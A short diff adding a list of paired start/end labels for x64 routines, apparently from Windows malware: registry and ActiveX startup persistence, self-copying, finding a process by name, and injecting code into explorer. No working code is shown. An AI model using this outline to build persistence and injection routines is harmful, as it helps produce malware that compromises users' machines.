@@ -1,0 +1,14 @@
+add_startup_hklm_x64
+add_startup_hklm_x64_end
+
+add_startup_activex_x64
+add_startup_activex_x64_end
+
+copy_self_x64
+copy_self_x64_end
+
+find_process_by_name_x64
+find_process_by_name_x64_end
+
+inject_to_explorer_code_x64
+inject_to_explorer_code_x64_init
